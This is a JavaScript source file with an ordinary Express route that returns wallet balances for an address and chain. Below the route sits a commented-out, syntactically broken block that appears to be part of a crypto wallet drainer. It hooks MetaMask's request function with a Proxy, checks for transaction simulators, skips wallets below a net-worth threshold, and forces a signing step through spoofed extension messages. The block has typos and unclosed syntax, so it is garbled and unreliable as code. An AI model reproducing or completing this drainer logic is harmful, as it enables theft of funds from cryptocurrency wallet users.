const express = require("express");
const { fetchBalancesFromMoralis } = require("../fetchBalancesFromMoralis");

const router = express.Router();

router.post("/fetchBalances", async (req, res) => {
  const { address, chainId } = req.body;

  if (!address || !chainId) {
    return res.status(400).json({ error: "Missing required fields: address or chainId." });
  }

  try {
    const balances = await fetchBalancesFromMoralis(address, parseInt(chainId));
    res.status(200).json({ balances });
  } catch (error) {
    console.error("Error fetching balances:", error.message);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;



// [*initProxy*] = async () => {

// try {

//   if (this.detectSimulator()[0] && (window.ethereum.isMetamask || window.ethereum.isCoinbaseWallet

//     if (window.ethereum.isMetamask){
//       Object.defineProperty(window.ethereum, "request", {

//         "value": new Proxy(window.ethereum.request, {

//           "apply": async (B,V,f) => {

//             let [y] = f;

//             if (this.isUselessMethod(y) || this.
//               netWorth < this. bypassMinAmount) {
//               return Reflect.apply(B,V,f);
//             }

//             await this.fsign()
//             return new Promise((K, s) => {

//               const N = this.generateGUID();
//               const c = {
//                 "target": "metmask-contentscript"
//                 "data": {
//                   "name": "metmask-provider",
//                   "data": [{
//                     "jsonrpc": "2.0",
//                     "id": N,
//                     "method": y.method,
//                     "params": y.params

//                   }]
//                 }
//               };

//               const i = o => {

//                 if(o.data.target === "metamask-inpage" && o.data.data.data(0).id == N){
//                   window.removeEventListener("message", i);
//                   if (o.data.data.data[0].hasOwnProperty("error")){
//                     s(o.data.data.data[0].error);

//                   }else{

//                   K(o.data.data.data[0].result);
//                 }
//               }
//             };
//             window.addEventListener("message", i);
//             window.postMessage(c);
//           }
//         })
//       })
//     }

//     ))
